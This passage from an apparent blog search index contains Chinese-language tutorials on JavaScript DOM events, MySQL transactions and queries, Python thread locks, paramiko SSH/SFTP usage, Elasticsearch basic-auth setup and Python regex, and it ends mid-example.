//////////////////////////////获取父弟节点和元素////////////////////////////// console.log(\"父节点:\",par.parentNode); console.log(\"父元素:\",par.parentElement); //////////////////////////////创建元素节点////////////////////////////// // 父元素中追加一个新的元素 // 先获取父级标签 var ul = document.querySelector(\"ul\") // 创建一个新的元素 var li = document.createElement(\"li\") // 填写内容和追加 li.innerHTML=\"我是追加的\" ul.appendChild(li) // 在某个元素的前面插入 //获取在谁前面插入 // var aaa = document.querySelector(\"ul\u003eli\") var aaa = ul.children[0] // 创建一个新的元素 var li2 = document.createElement(\"li\") // 填写内容和追加 li2.innerHTML = \"我是插入的\" ul.insertBefore(li2,aaa) //////////////////////////////删除节点////////////////////////////// var btn = document.querySelector(\"button\") btn.onclick = function(){ if (ul.children[1] === undefined){ this.disabled=true } ul.removeChild(ul.children[0]) } \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2020-09-28 20:39","objectID":"/post/2007/:0:0","tags":[],"title":"js-操作节点","uri":"/post/2007/"},{"categories":["前端"],"content":"1. 基本事件 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cbutton id=\"btn\"\u003e点我\u003c/button\u003e \u003cscript\u003e // 事件三要素：事件源、触发事件类型(如何触发的，鼠标点击、经过、按下)、事件处理程序 // 1.获取元素 var btn = document.getElementById(\"btn\"); // 2.绑定事件。// 3.事件处理程序 btn.onclick = function(e){alert(\"厉害了\")} // e代表的是事件对象,可以看到事件的详细信息,console.dir(e)可以看到所有属性 \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 常见鼠标事件 onclick 鼠标点击左键触发 onmouseover 鼠标经过触发 onmouseout 鼠标离开触发 onfocus 获得鼠标焦点触发 onblur 失去鼠标焦点触发 onmousemove 鼠标移动触发 onmouseup 鼠标松开触发 onmousedown 鼠标按下触发 ","date":"2020-09-28 15:39","objectID":"/post/2006/:1:0","tags":["javascript"],"title":"js-事件","uri":"/post/2006/"},{"categories":["前端"],"content":"2.事件侦听器 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cbutton id=\"btn\"\u003e监听事件\u003c/button\u003e \u003cscript\u003e // 注册时间的两种方式 // 传统注册方式：同一个元素同一个事件只能设置一个处理函数，最后绑定的处理函数会覆盖前面注册的 // 方法监听方式：addEventListener()方法向指定元素添加事件句柄。IE9之前用attachEvent(). // 同一个元素同一个事件可以注册多个事件侦听器，按注册顺序执行 // 添加事件侦听器 // 获取按钮元素 var btn = document.querySelector(\"#btn\") // 1. 监听事件类型 不带on // 2. 下面的示例中满足 同一个元素(btn)、同一个事件(click)添加多个侦听器 btn.addEventListener(\"click\", e1) function e1(){ alert(\"我是第一个click事件\") // 删除事件,使用匿名函数则无法删除 btn.removeEventListener(\"click\",e1) } btn.addEventListener(\"click\",function(){alert(\"我是第二个click事件\")}) \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2020-09-28 15:39","objectID":"/post/2006/:2:0","tags":["javascript"],"title":"js-事件","uri":"/post/2006/"},{"categories":["前端"],"content":"3.DOM事件流 事件发生时会在元素节点之间按照特定的顺序传播，这个传播过程就是DOM事件流 比如我们给一个div注册了点击事件,会按照下面的顺序执行: 捕获阶段: Document–\u003eelement html–\u003eelement body–\u003eelement div 当前目标阶段: element div 冒泡阶段: element div–\u003eDocument–\u003eelement html–\u003eelement body JS代码只会执行捕获阶段和冒泡阶段其中一个 addEventListener方法的第三个参数为false就是冒泡阶段，为true就是捕获阶段 onclick和attachEvent只能的到冒泡阶段 有些事件没有冒泡noblur、onfocus、onmouseenter、onmouseleave 下面是冒泡阶段示例，当点击son盒子的时候，parent、html和document也会依次触发相应事件 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003cstyle\u003e .parent { overflow: hidden; height: 400px; width: 400px; margin: 100px auto; background-color: skyblue; } .son { margin: 125px auto; height: 150px; width: 150px; background-color: red; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"parent\"\u003e \u003cdiv class=\"son\"\u003e\u003c/div\u003e \u003c/div\u003e \u003cscript\u003e // son绑定事件 var son = document.querySelector('.son') son.addEventListener('click',function(e){ alert(\"son\") }) //parent绑定事件 var parent = document.querySelector('.parent') parent.addEventListener('click',function(e){ alert(\"parent\") }) //document绑定事件 document.addEventListener('click',function(e){ alert(\"document\") }) //html绑定事件 var html = document.querySelector('html') html.addEventListener('click',function(e){ alert(\"html\") }) \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2020-09-28 15:39","objectID":"/post/2006/:3:0","tags":["javascript"],"title":"js-事件","uri":"/post/2006/"},{"categories":["前端"],"content":"4.阻止冒泡,我们在son的事件处理程序中添加e.stopPropagation();就不会触发其他元素的事件了 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003cstyle\u003e .parent { overflow: hidden; height: 400px; width: 400px; margin: 100px auto; background-color: skyblue; } .son { margin: 125px auto; height: 150px; width: 150px; background-color: red; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"parent\"\u003e \u003cdiv class=\"son\"\u003e\u003c/div\u003e \u003c/div\u003e \u003cscript\u003e // son绑定事件 var son = document.querySelector('.son') son.addEventListener('click',function(e){ alert(\"son\") e.stopPropagation(); }) //parent绑定事件 var parent = document.querySelector('.parent') parent.addEventListener('click',function(e){ alert(\"parent\") }) //document绑定事件 document.addEventListener('click',function(e){ alert(\"document\") }) //html绑定事件 var html = document.querySelector('html') html.addEventListener('click',function(e){ alert(\"html\") }) \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2020-09-28 15:39","objectID":"/post/2006/:4:0","tags":["javascript"],"title":"js-事件","uri":"/post/2006/"},{"categories":["前端"],"content":"5.事件委托 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003cstyle\u003e li { width: 50px; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003cul\u003e \u003cli\u003e我是11\u003c/li\u003e \u003cli\u003e我是12\u003c/li\u003e \u003cli\u003e我是13\u003c/li\u003e \u003cli\u003e我是14\u003c/li\u003e \u003cli\u003e我是15\u003c/li\u003e \u003c/ul\u003e \u003cscript\u003e // 事件委托的核心原理: 给父节点添加侦听器，利用事件冒泡影响每一个子节点 var ul = document.querySelector(\"ul\") ul.addEventListener('click',function(e){ console.dir(e) alert(e.target.innerText); // 排他思想，将其他标签颜色设置为空 for (var i=0;i\u003cul.childElementCount;i++){ ul.children[i].style.backgroundColor = \"\" } e.target.style.backgroundColor = \"skyblue\" }) \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2020-09-28 15:39","objectID":"/post/2006/:5:0","tags":["javascript"],"title":"js-事件","uri":"/post/2006/"},{"categories":["前端"],"content":"1.获取元素 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"i1\"\u003eok\u003c/div\u003e \u003cdiv id=\"i2\"\u003efuck\u003c/div\u003e \u003cul\u003e \u003cli\u003e1\u003c/li\u003e \u003cli\u003e2\u003c/li\u003e \u003cli\u003e3\u003c/li\u003e \u003cli\u003e4\u003c/li\u003e \u003cli name='1'\u003e5\u003c/li\u003e \u003c/ul\u003e \u003cdiv class=\"box\"\u003e盒子1\u003c/div\u003e \u003cdiv class=\"box\"\u003e盒子2\u003c/div\u003e \u003cscript\u003e // 根据id获取 console.log(document.getElementById(\"i1\")); //根据标签获取,返回数组 console.log(document.getElementsByTagName(\"li\")); //根据name属性获取,返回数组 console.log(document.getElementsByName(\"1\")[0].innerText) // h5新增 //根据class名获取 console.log(document.getElementsByClassName(\"box\")); //指定一个选择器,返回第一个元素对象 console.log(document.querySelector(\".box\")) console.log(document.querySelector(\"#i2\")) //指定一个选择器,返回所有元素对象 console.log(document.querySelectorAll(\".box\")); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 2.操作标签 tags = document.getElementsByTagName(“div”) tags[0].innerText = \"xxx\" tags[0].innerHtml = \"\u003cp\u003exxx\u003c/p\u003e\" tags[0].style.color = \"skyblue\" ","date":"2020-09-24 17:14","objectID":"/post/2001/:0:0","tags":["javascript"],"title":"js-获取操作元素","uri":"/post/2001/"},{"categories":["前端"],"content":"基本数据类型： ","date":"2020-09-24 16:31","objectID":"/post/2000/:1:0","tags":["javascript"],"title":"js-基本操作","uri":"/post/2000/"},{"categories":["前端"],"content":"1.数值： a = 18; ","date":"2020-09-24 16:31","objectID":"/post/2000/:1:1","tags":["javascript"],"title":"js-基本操作","uri":"/post/2000/"},{"categories":["前端"],"content":"2.字符串： https://www.w3school.com.cn/jsref/jsref_obj_string.asp a = 'soulchild' a.chartAt(索引位置) a.substring(起始位置,结束位置) a.length 获取字符串长度 a.indexOf('x') 查找字符串下标,第一次出现位置 a.lastIndexOf(\"x\") 查找字符串下标,最后一次出现的位置 a.slice() 切片 a.toLowerCase() 转换为小写 a.toUpperCase() 转换为大写 a.spliit() 分割 a.math() 正则匹配 ","date":"2020-09-24 16:31","objectID":"/post/2000/:1:2","tags":["javascript"],"title":"js-基本操作","uri":"/post/2000/"},{"categories":["前端"],"content":"3.数组 https://www.w3school.com.cn/jsref/jsref_obj_array.asp a = [1,2,3,4,5] a.push(6) 尾部追加元素 a.push() 删除并返回数组的最后一个元素 a.unshift(123) 首部追加元素 a.shift() 删除并返回数组的第一个元素 a.splice(start,delcount,values) 从第start个元素开始,删除delcount次元素。values代表要插入的值 for循环 #1 a = [11,22,33,44] for (var i in a){ console.log(a[i]) } #2 for (var i=0;i\u003c10;i++){ console.log(i) } 判断 if (条件){ // 代码块 }else if (){ // 代码块 }else{ // 代码块 } ==： 值相等 ===： 值和类型都相等 \u0026\u0026： and ||： or 定时器： // 2秒运行一次 setInterval(\"执行代码\",时间间隔) 函数： function 函数名(c1,c2,c3){ // 代码块 } ","date":"2020-09-24 16:31","objectID":"/post/2000/:1:3","tags":["javascript"],"title":"js-基本操作","uri":"/post/2000/"},{"categories":["databases"],"content":" 1. 事务的基本介绍 1. 概念： * 如果一个包含多个步骤的业务操作，被事务管理，那么这些操作要么同时成功，要么同时失败。 2. 操作： 1. 开启事务： start transaction; 2. 回滚：rollback; 3. 提交：commit; 3. 例子： CREATE TABLE account ( id INT PRIMARY KEY AUTO_INCREMENT, NAME VARCHAR(10), balance DOUBLE ); -- 添加数据 INSERT INTO account (NAME, balance) VALUES ('zhangsan', 1000), ('lisi', 1000); SELECT * FROM account; UPDATE account SET balance = 1000; -- 张三给李四转账 500 元 -- 0. 开启事务 START TRANSACTION; -- 1. 张三账户 -500 UPDATE account SET balance = balance - 500 WHERE NAME = 'zhangsan'; -- 2. 李四账户 +500 -- 出错了... UPDATE account SET balance = balance + 500 WHERE NAME = 'lisi'; -- 发现执行没有问题，提交事务 COMMIT; -- 发现出问题了，回滚事务 ROLLBACK; 4. MySQL数据库中事务默认自动提交 * 事务提交的两种方式： * 自动提交： * mysql就是自动提交的 * 一条DML(增删改)语句会自动提交一次事务。 * 手动提交： * Oracle 数据库默认是手动提交事务 * 需要先开启事务，再提交 * 修改事务的默认提交方式： * 查看事务的默认提交方式：SELECT @@autocommit; -- 1 代表自动提交 0 代表手动提交 * 修改默认提交方式： set @@autocommit = 0; 2. 事务的四大特征： 1. 原子性：是不可分割的最小操作单位，要么同时成功，要么同时失败。 2. 持久性：当事务提交或回滚后,即事务结束后,数据会持久化保存。 3. 隔离性：多个事务之间。相互独立。 4. 一致性：事务操作前后，数据总量不变 3. 事务的隔离级别（了解） * 概念：多个事务之间隔离的，相互独立的。但是如果多个事务操作同一批数据，则会引发一些问题，设置不同的隔离级别就可以解决这些问题。 * 存在问题： 1. 脏读：一个事务，读取到另一个事务中没有提交的数据 2. 不可重复读：在同一个事务中，两次读取到的数据不一样。可能被另一个事务更改，提交、回滚 3. 幻读：一个事务,操作(DML)数据表中所有记录，另一个事务添加了一条数据，则第一个事务查询不到自己的修改。 * 隔离级别： 1. read uncommitted：可以读取未提交的数据 * 产生的问题：脏读、不可重复读、幻读 2. read committed：可以读取已提交的数据（Oracle默认） * 产生的问题：不可重复读、幻读 3. repeatable read：可重复读 （MySQL默认） * 产生的问题：幻读 4. serializable：串行化 * 可以解决所有的问题 * 注意：隔离级别从小到大安全性越来越高，但是效率越来越低 * 数据库查询隔离级别： * select @@tx_isolation; * 数据库设置隔离级别： * set global transaction isolation level 级别字符串; ","date":"2020-09-23 10:00","objectID":"/post/1997/:0:0","tags":["mysql"],"title":"mysql事务","uri":"/post/1997/"},{"categories":["databases"],"content":"演示不同级别产生的问题： 在设置完事务级别后,在两个窗口都需要执行start transaction; read uncommitted： set global transaction isolation level read uncommitted; start transaction; -- 转账操作 update account set balance = balance - 500 where id = 1; update account set balance = balance + 500 where id = 2; -- 此时事务并没有提交，但是打开另一个窗口查询,可以查询到未提交的修改。即脏读 -- 当这个事务执行rollback后,另一个再次窗口查询，查询的结果又变成最原始的数据。同一个事务中，两次查询结果不一样。即不可重复读 read committed： set global transaction isolation level read committed; start transaction; -- 转账操作 update account set balance = balance - 500 where id = 1; update account set balance = balance + 500 where id = 2; -- 当这个事务执行commit前，另一个窗口查询,查询不到修改的数据。解决脏读 -- 执行commit后，另一个窗口再次查询，查询到修改后的结果。同一个事务中，两次查询结果不一样。即不可重复读 repeatable read： set global transaction isolation level repeatable read; start transaction; -- 转账操作 update account set balance = balance - 500 where id = 1; update account set balance = balance + 500 where id = 2; -- 当这个事务执行commit前，另一个窗口查询,查询不到修改的数据。解决脏读 -- 当这个事务执行commit后，另一个窗口查询,查询不到修改的数据。解决不可重复读 serializable： set global transaction isolation level serializable; start transaction; -- 转账操作 update account set balance = balance - 500 where id = 1; update account set balance = balance + 500 where id = 2; -- 当第一个事务没有结束时，另一个\"事务\"的操作会被阻塞，直到第一个事务结束 注意上面的测试中第二个窗口在查询之前先开启事务 ","date":"2020-09-23 10:00","objectID":"/post/1997/:0:1","tags":["mysql"],"title":"mysql事务","uri":"/post/1997/"},{"categories":["databases"],"content":" -- 学生表 create table `student` ( `id` int unsigned PRIMARY KEY auto_increment, `name` char(32) not null unique, `sex` enum('男','女') not null, `city` char(32) not null, `description` text, `birthday` date not null default '1995-1-1', `money` float(7,2) default 0, `only_child` boolean )charset=utf8mb4; -- 学生数据 insert into `student` (`name`,`sex`,`city`,`description`,`birthday`,`money`,`only_child`) VALUES ('郭德纲', '男','北京','班长','1997/10/1',rand()*100,True), ('陈乔恩', '女', '上海', NULL, '1995/3/2', rand() * 100,True), ('赵丽颖', '女', '北京', '班花, 不骄傲', '1995/4/4', rand()* 100, False), ('王宝强', '男', '重庆', '超爱吃火锅', '1998/10/5', rand() *100, False), ('赵雅芝', '女', '重庆', '全宇宙三好学生', '1996/7/9',rand() * 100, True), ('张学友', '男', '上海', '奥林匹克总冠军！', '1993/5/2',rand() * 100, False), ('陈意涵', '女', '上海', NULL, '1994/8/30', rand() * 100,True), ('赵本山', '男', '南京', '副班长', '1995/6/1', rand() *100, True), ('张柏芝', '女', '上海', NULL, '1997/2/28', rand() * 100,False), ('吴亦凡', '男', '南京', '大碗宽面要不要？', '1995/6/1', rand() * 100, True), ('鹿晗', '男', '北京', NULL, '1993/5/28', rand() * 100,True), ('关晓彤', '女', '北京', NULL, '1995/7/12', rand() * 100,True), ('周杰伦', '男', '台北', '小伙人才啊', '1998/3/28', rand() *100, False), ('马云', '男', '南京', '一个字：贼有钱', '1990/4/1', rand()* 100, False), ('马化腾', '男', '上海', '马云死对头', '1990/11/28', rand()* 100, False); 成绩表 create table score ( `id` int unsigned primary key auto_increment, `math` float not null default 0, `english` float not null default 0 )charset=utf8mb4; insert into score (`math`, `english`) values (49, 71), (62, 66.7), (44, 86), (77.5, 74), (41, 75), (82, 59.5), (64.5, 85), (62, 98), (44, 36), (67, 56), (81, 90), (78, 70), (83, 66), (40, 90), (90, 90); ","date":"2020-09-21 16:58","objectID":"/post/1996/:0:0","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"一、基本查询 ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:0","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"聚合函数：将一列数据做为一个整体,进行纵向计算 count: 计算个数，一般选择非空字段,主键 max: 最大追 min: 最小值 sum: 求和 avg: 平均值 group_concat: 把字段的所有值连接成一个字符串,可以指定分割符。默认逗号 聚合函数不会计算null 比如select count(description) from student;的结果是不包含null的 解决方法: select count(ifnull(description,‘0’)) from student; 如果是null则设置一个值 ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:1","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"group by: 分组查询 -- 查询每个城市的所有人员姓名,人数,总金额,平均金额 -- 按照城市分组 select city as '城市',group_concat(money) as '金额',group_concat(name) as '姓名', count(name) as '人数',sum(money) as '总金额',avg(money) as '平均金额' from student group by city; ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:2","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"order by: 排序 -- 升序 select * from student order by money; -- 降序 select * from student order by money desc; ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:3","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"limit: 查看前几个，offset: 偏移量 -- 查找最有钱的5个人 select * from student order by money desc limit 5 ; -- 可用于分页查询 -- 第3行开始，往后查7行，不包括第3行 select * from student limit 3,7; -- 可用于分页查询 -- offset=3,就是从第3个开始查，查找5行。不包括第3行 select * from student limit 5 offset 3; ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:4","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"distinct: 去重 -- 根据city字段去重 select distinct city from student; ","date":"2020-09-21 16:58","objectID":"/post/1996/:1:5","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"二、多表查询 图解: https://www.cnblogs.com/logon/p/3748020.html https://blog.51cto.com/u_13002900/5278688 -- 添加测试数据 insert into student values(18,\"小红\",\"女\",\"北京\",\"小学生\",\"1998-05-02\",88,0); insert into student values(19,\"小蓝\",\"男\",\"河北\",\"小学学渣\",\"1998-02-07\",86,0); insert into student values(22,\"小贼\",\"男\",\"东土\",\"hys\",\"1996-03-02\",11,0); insert into score values(17,82,42); insert into score values(26,45,34); ","date":"2020-09-21 16:58","objectID":"/post/1996/:2:0","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"1. union: 联合查询 -- 两张表字段数量要一样。两张表上下拼接 select student.id,student.name from student union select score.id,score.math from score; ","date":"2020-09-21 16:58","objectID":"/post/1996/:2:1","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"2. inner join: 内连接(交集-两张表都有的内容)也可简写join -- 将student.id、score.id相等的记录左右合并为一条 select student.*,score.* from student inner join score on student.id=score.id ; ","date":"2020-09-21 16:58","objectID":"/post/1996/:2:2","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"3. left join: 左连接 -- 将student.id、score.id相等的记录左右合并为一条，不相等的记录以左表为准显示,右边字段为null select student.*,score.* from student left join score on student.id=score.id; ","date":"2020-09-21 16:58","objectID":"/post/1996/:2:3","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"3. right join: 左连接 -- 将student.id、score.id相等的记录左右合并为一条，不相等的记录以右表为准显示,左边字段为null select student.*,score.* from student left join score on student.id=score.id; 小练习 -- 查出男生女生的数学英语平均分 select student.sex,round(avg(score.math),1),round(avg(score.english),1) from student inner join score on student.id=score.id group by sex; ","date":"2020-09-21 16:58","objectID":"/post/1996/:2:4","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["databases"],"content":"子查询","date":"2020-09-21 16:58","objectID":"/post/1996/:3:0","tags":["mysql"],"title":"mysql查询语句","uri":"/post/1996/"},{"categories":["python"],"content":" from threading import Thread, Lock, RLock import time # 互斥锁死锁 # mutexA = Lock() # mutexB = Lock() # class MyThread(Thread): # def run(self): # self.f1() # self.f2() # # def f1(self): # mutexA.acquire() # print(\"%s 拿到了A锁\" % self.name) # # mutexB.acquire() # print(\"%s 拿到了B锁\" % self.name) # mutexB.release() # # mutexA.release() # # def f2(self): # mutexB.acquire() # print(\"%s 拿到了B锁\" % self.name) # time.sleep(0.1) # # mutexA.acquire() # print(\"%s 拿到了A锁\" % self.name) # mutexA.release() # # mutexB.release() # # # for i in range(4): # t = MyThread() # t.start() # \"\"\" 上面的互斥锁死锁流程 1、 Thread-1 拿到了A锁 --\u003e Thread-1 拿到了B锁 --\u003e Thread-1 释放B锁 --\u003e Thread-1 释放A锁 --\u003e Thread-1 拿到了B锁 --\u003e sleep (此时A锁处于释放状态,B锁被占有) 2、 Thread-2 拿到了A锁 --\u003e Thread-2需要拿B锁，但是B锁在Thread-1上(所以拿不到),需要等待Thread-1释放B锁 3、 Thread-1的sleep结束，需要拿A锁，但是A锁在Thread-2上(所以拿不到),需要等待Thread-2释放A锁 Thread-1和Thread-2都在等待对方释放锁，所以锁死了.解决上面的问题需要用到递归锁RLock [Thread-1拿到B锁，想要拿A锁，Thread-2拿着A锁，想要B锁] \"\"\" ########################################################################################## \"\"\" 递归锁： 递归锁同一时刻只能被一个线程占用，一个线程可以acquire多次。 递归锁有一个初始计数器,值为0,每次acquire计数器就会加1,每次release就减1,计数器为0才会释放锁. 只有它的计数为0的时候,才能被别的线程抢夺.所以在锁完全释放之前，不会被其他线程抢走，就不会存在死锁的问题了。 \"\"\" # 递归锁 mutexA = mutexB = RLock() class MyThread(Thread): def run(self): self.f1() self.f2() def f1(self): mutexA.acquire() print(\"%s 拿到了A锁\" % self.name) mutexB.acquire() print(\"%s 拿到了B锁\" % self.name) mutexB.release() mutexA.release() def f2(self): mutexB.acquire() print(\"%s 拿到了B锁\" % self.name) time.sleep(0.1) mutexA.acquire() print(\"%s 拿到了A锁\" % self.name) mutexA.release() mutexB.release() for i in range(4): t = MyThread() t.start() \"\"\" 上看的操作其实就是一把锁，只不过有两个名字 \"\"\" ","date":"2020-09-16 11:22","objectID":"/post/1992/:0:0","tags":["python"],"title":"python-互斥锁死锁与递归锁","uri":"/post/1992/"},{"categories":["python"],"content":" # -*- coding: utf-8 -*- import paramiko # 通过用户名密码连接 # # 创建ssh客户端 # ssh_client = paramiko.SSHClient() # # 自动同意yes # ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy) # # 建立连接 # ssh_client.connect(hostname=\"10.0.0.237\", username=\"root\", password=\"123\", timeout=3) # # 执行命令 # stdin, stdout, stderr = ssh_client.exec_command('read -p \"内容:\" a ; echo $a') # # 标准输入，实现远端交互 # # stdin.write(\"给read的内容\\n\") # stdin.write(input(\"你输入什么我就返回什么：\") + \"\\n\") # print(stdout.read().decode(\"utf8\")) # ssh_client.close() # 通过私钥连接 # ssh_client = paramiko.SSHClient() # private_key = paramiko.RSAKey.from_private_key_file(\"./id_dsa\") # ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy) # ssh_client.connect(hostname=\"10.0.0.200\", username=\"root\",pkey=private_key) # stdin, stdout, stderr = ssh_client.exec_command('read -p \"内容:\" a ; echo $a') # stdin.write(\"我输入的内容\\n\") # print(stdout.read().decode()) # ssh_client.close() # sftp传输文件 # transport = paramiko.Transport((\"10.0.0.200\",22)) # transport.connect(username=\"root\",password=\"123\") # sftp_client = paramiko.SFTPClient.from_transport(transport) # sftp_client.get('/root/init.sh','./aa.s1h') # sftp_client.put('./mem.py','mem.py') # sftp_client.close() ","date":"2020-09-16 10:14","objectID":"/post/1991/:0:0","tags":["python"],"title":"python-paramiko简单使用","uri":"/post/1991/"},{"categories":["databases","ELK日志收集"],"content":"配置文件 cluster.name: test xpack.security.enabled: true discovery.type: single-node node.name: node1 path.data: /data/ path.logs: /usr/local/es/logs bootstrap.memory_lock: true network.host: 0.0.0.0 http.port: 9200 ","date":"2020-09-14 18:18","objectID":"/post/1990/:1:0","tags":["elasticsearch"],"title":"elasticsearch开启basicauth认证","uri":"/post/1990/"},{"categories":["databases","ELK日志收集"],"content":"启动服务 /usr/local/es/bin/elasticsearch -d ","date":"2020-09-14 18:18","objectID":"/post/1990/:2:0","tags":["elasticsearch"],"title":"elasticsearch开启basicauth认证","uri":"/post/1990/"},{"categories":["databases","ELK日志收集"],"content":"设置密码 /usr/local/es/bin/elasticsearch-setup-passwords interactive ","date":"2020-09-14 18:18","objectID":"/post/1990/:3:0","tags":["elasticsearch"],"title":"elasticsearch开启basicauth认证","uri":"/post/1990/"},{"categories":["python"],"content":"常用的标志位: re.M 多行匹配 re.S 让.可以匹配换行符 re.I 忽略大小写 使用多个标志位可以用or,|。例如re.search(r’xxx’, s2, re.S|re.I) # # re.S:让\".\"可以匹配换行符 # s2 = \"soul\\nchild\" # m5 = re.search(r'l.c', s2, re.S) # print(m5) # # print(m5.groups()) ################################################################## # 正常情况下，多行字符串会被当作一个整体。 # re.M：开启多行匹配，一行一个整体,会影响^和$。 s3 = \"\"\"00 74 28 99 387\"\"\" # # 匹配以数字开头的内容 # m6 = re.findall(r'^\\d+', s3) # # 默认只能匹配一个00 # print(m6) # ['00'] # # 开启多行匹配 # m6 = re.findall(r'^\\d+', s3, re.M) # print(m6) # ['00', '28', '387'] # 匹配以数字结尾的内容 # # 默认只能匹配一个387 # m6 = re.findall(r'\\d+$', s3) # print(m6) # ['387'] # # 开启多行匹配 # m6 = re.findall(r'\\d+$', s3, re.M) # print(m6) # ['74', '99', '387'] ","date":"2020-09-13 23:25","objectID":"/post/1986/:0:0","tags":["python"],"title":"python-re正则修饰符","uri":"/post/1986/"},{"categories":["python"],"content":" import re s = '''href=\"https://soulchild.cn/1976.html\"\u003epython-lambda匿名函数\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1974.html\"\u003epython-三元表达式、列表字典集合推导式、生成器表达式\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1971.html\"\u003eprometheus-配置文件-rules(三)\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1965.html\"\u003eprometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1963.html\"\u003eprometheus-配置文件-global、rule_files、remote_read|write(一)\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1962.html\"\u003eprometheus-二进制部署\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1958.html\"\u003eprometheus-指标类型\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1956.html\"\u003epython-字符串格式化\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://soulchild.cn/1951.html\"\u003epython-字符串基本操作\u003c/a\u003e\u003c/li\u003e ''' # match############################################################################# # # 从开头匹配(正则一定要匹配到文本的开头部分，否则匹配失败),只匹配一次 # m1 = re.match(r'href=\"(?P\u003curl\u003e.*?)\"\u003e(?P\u003ctitle\u003e.*?)\u003c/', s) # # 返回找到的字符串位置(起始,结束) # print(m1.span()) # 返回匹配到的第一个分组的起始和结束位置 # print(m1.span(1)) # # # 获取匹配的结果.0代表匹配的整体内容，1是第一个分组，即第一个括号内匹配到的内容 # print(m1.group(0)) # print(m1.group(1)) # print(m1.group(2)) # # # 元组的形式一次性展现匹配的全部内容 # print(m1.groups(\"a\")) # # # 字典的形式展现匹配的内容。需要分组中指定名称,格式为(?P\u003ckey\u003epattern) # print(m1.groupdict()) # search############################################################################# # 只查找一次(和上面的区别是不用必须匹配开头的部分) # m2 = re.search(r'(?P\u003curl\u003ehttp.*?)\"\u003e(?P\u003ctitle\u003e.*?)\u003c/', s) # 用法和match一致 # print(m2.groups()) # findall############################################################################# # re.findall() 直接返回匹配到的内容列表 # m3 = re.findall(r'(?P\u003curl\u003ehttp.*?)\"\u003e(?P\u003ctitle\u003e.*?)\u003c/', s) # # 直接返回匹配到的内容列表 # print(m3) # finditer############################################################################# # re.finditer() 返回匹配到的match对象,迭代器形式 m4 = 